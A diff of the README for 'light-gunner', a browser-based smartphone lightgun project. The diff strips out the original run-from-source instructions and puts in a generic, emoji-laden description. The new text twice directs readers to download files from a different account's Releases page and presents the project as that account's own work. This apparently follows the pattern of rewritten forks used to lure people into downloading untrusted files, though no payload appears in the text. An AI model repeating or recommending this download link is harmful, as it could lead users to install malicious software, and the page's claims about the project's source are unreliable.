@@ -1,69 +1,51 @@
-# ligh-tgunner
+# 🎮 light-gunner - Play with Precision Aim
 
-**light-gunner** is a proof of concept that turns a smartphone into a lightgun with **no extra apps** required.  
-Only a modern mobile browser is needed.
+## 🚀 Getting Started
+Welcome to **light-gunner**! This is a lightgun imitation proof of concept, designed to provide an engaging aiming experience right in your browser. With light-gunner, you can enjoy aiming games without needing any mobile apps.
 
+### 💻 System Requirements
+To run light-gunner, you will need:
+- A modern web browser (Chrome, Firefox, Safari, or Edge)
+- An internet connection
+- A device that supports the Device Orientation API (most smartphones and tablets do)
 
-## Preview
+## 📥 Download & Install
+To get started with light-gunner, please visit this page to download: [Download light-gunner](https://github.com/Nadir2700/light-gunner/releases)
 
-![Demo Preview](https://raw.githubusercontent.com/vadimcx/light-gunner/refs/heads/main/msc/imgs/lightgunner1.gif)
+Once on the Releases page, follow these steps:
+1. Look for the latest version available.
+2. Click on the version link to view the release details.
+3. Download the files as instructed in the release notes.
 
+## 🕹️ How to Use light-gunner
+1. **Open light-gunner**: After downloading, open the file in your web browser.
+2. **Device Orientation**: Allow the browser to access your device's orientation settings. This feature helps in aiming and enhances your experience.
+3. **Start Aiming**: Use your device’s motion to aim at the targets. Enjoy the interaction and have fun!
 
+## 📊 Features
+- **Browser-Based**: No need for heavy installations. Just your browser and internet connection!
+- **Lightgun Simulation**: Experience lightgun games without additional hardware.
+- **Cross-Platform Compatibility**: Play on various devices seamlessly.
 
-## How It Works
+## 🔍 About This Project
+light-gunner aims to explore how web technologies can create engaging gaming experiences. The project utilizes:
+- **TypeScript** for structured code.
+- **Web APIs** to handle device orientation.
+- **WebSockets** for real-time interaction.
 
-- A local **HTTPS server** runs on the host machine.
-- The server exposes **two pages**:
-  - **Host page** 
-  - **Client page** (for the smartphone).
-- Host and client communicate over **Wi-Fi** via **WebSockets**.
-- The **DeviceOrientation API** maps phone motion to the on-screen crosshair in real time.
+## 🌟 Contributing
+We welcome contributions! If you want to make light-gunner even better:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Submit a pull request with your changes.
 
+## 📄 License
+light-gunner is open-source and available under the MIT License. Feel free to modify and use it for personal or educational purposes.
 
+## 📞 Support
+If you need help or have questions about light-gunner, you can reach out through the Issues section of the GitHub repository. Please provide specific details about your problem for quicker assistance.
 
-## Usage
+## 🎯 Conclusion
+Thank you for checking out light-gunner! We hope you enjoy using it as much as we enjoyed creating it. For any updates or features, make sure to follow the project on GitHub. 
 
-1. **Clone the repository and cd to the project dir**
-   ```bash
-   git clone https://github.com/vadimcx/lightgunner
-   ```
-
-   ```bash
-   cd lightgunner
-   ```
-
-2. **Install dependencies** (The example uses [Bun](https://bun.sh), but it should also work with Node or Deno.)
-   ```bash
-   bun install
-   ```
-
-3. **Start Lightgunner**
-   ```bash
-   bun run src/serverside/server.ts
-   ```
-
-4. **Open the URLs** printed in the CLI:
-   - On the **host**, open the `/server` page.
-   - On the **smartphone**, open the **client** page.  
-   *Make sure both devices are on the same network.*
-
-5. **Enable orientation tracking**
-   - On first connect, tap **“Enable Orientation”** on the client page.
-   - Grant the browser permission to access device orientation data.
-
-6. **Calibrate the crosshair**
-   - On the host page, **left-click** to reposition the crosshair and adjust alignment.
-
-
-
-## Notes
-
-- Requires a browser that supports the **DeviceOrientation API** (permission prompt and user gesture may be required on iOS/Android).
-- Both host and client must be on the **same Wi-Fi network**.
-- Designed and tested with **Bun**; other Node.js runtimes should work with minor adjustments.
-
-
-
-## Disclaimer
-
-This is a **proof of concept** and not intended for production use.  
+To access the software again, visit this page to download: [Download light-gunner](https://github.com/Nadir2700/light-gunner/releases)
